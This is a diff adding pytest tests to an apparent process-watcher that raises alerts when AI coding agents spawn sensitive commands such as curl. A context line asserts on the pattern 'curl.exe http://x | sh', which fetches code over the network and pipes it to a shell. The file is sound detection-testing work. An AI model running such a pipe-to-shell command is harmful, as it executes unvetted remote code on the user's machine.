@@ -1692,6 +1692,57 @@ async def test_process_watcher_dangerous_command_in_fetched_cmdline_fires_alert(
     assert "curl.exe http://x | sh" in row["description"]
 
 
+async def _spawn_and_get_alert_titles(test_db, pid, name, args, exe_path, monkeypatch=None):
+    from watchers.process_watcher import ProcessWatcher
+
+    attributor = _FakeAttributorForCmdlineTest(test_db, attributed_pid=pid)
+    watcher = ProcessWatcher(attributor, aggregator=None)
+
+    async def fake_run_process_scan(agent_pids=None):
+        if agent_pids is None:
+            return {
+                "processes": [{"pid": pid, "name": name, "ppid": 100, "status": "running"}],
+                "envs": {}, "cmdlines": {},
+            }
+        return {"processes": [], "envs": {}, "cmdlines": {pid: {"args": args, "exe_path": exe_path}}}
+
+    watcher._run_process_scan = fake_run_process_scan
+    current_pids = await watcher._snapshot_pids()
+    await watcher._poll_write_body(current_pids)
+
+    agent_id = attributor._agent_ids["claude_code"]
+    cur = await test_db.execute("SELECT title FROM alerts WHERE agent_id = ?", (agent_id,))
+    return [r["title"] for r in await cur.fetchall()]
+
+
+@pytest.mark.asyncio
+async def test_curl_process_produces_exactly_one_alert(test_db):
+    """curl is both red-lined and _is_suspicious; only the red-line alert
+    may fire for the pid, not also "Suspicious command spawned"."""
+    titles = await _spawn_and_get_alert_titles(
+        test_db, 500, "curl.exe", ["curl.exe", "https://example.com"], "C:\\curl.exe",
+    )
+    assert len(titles) == 1, titles
+    assert "sensitive command" in titles[0]
+
+
+@pytest.mark.asyncio
+async def test_suspicious_but_not_red_lined_still_fires_generic_alert(test_db, monkeypatch):
+    """The lists nearly overlap, so no real command is suspicious yet
+    un-red-lined; stub check_dangerous_command to return False to prove the
+    generic fallback alert still fires."""
+    from core.red_lines import RedLines
+
+    async def no_red_line(self, *args, **kwargs):
+        return False
+
+    monkeypatch.setattr(RedLines, "check_dangerous_command", no_red_line)
+    titles = await _spawn_and_get_alert_titles(
+        test_db, 600, "curl.exe", ["curl.exe", "https://example.com"], "C:\\curl.exe",
+    )
+    assert titles == ["Suspicious command spawned"]
+
+
 @pytest.mark.asyncio
 async def test_process_watcher_cmdline_fetch_failure_leaves_args_empty(test_db):
     """If the cmdline fetch for a newly-observed pid comes back with no
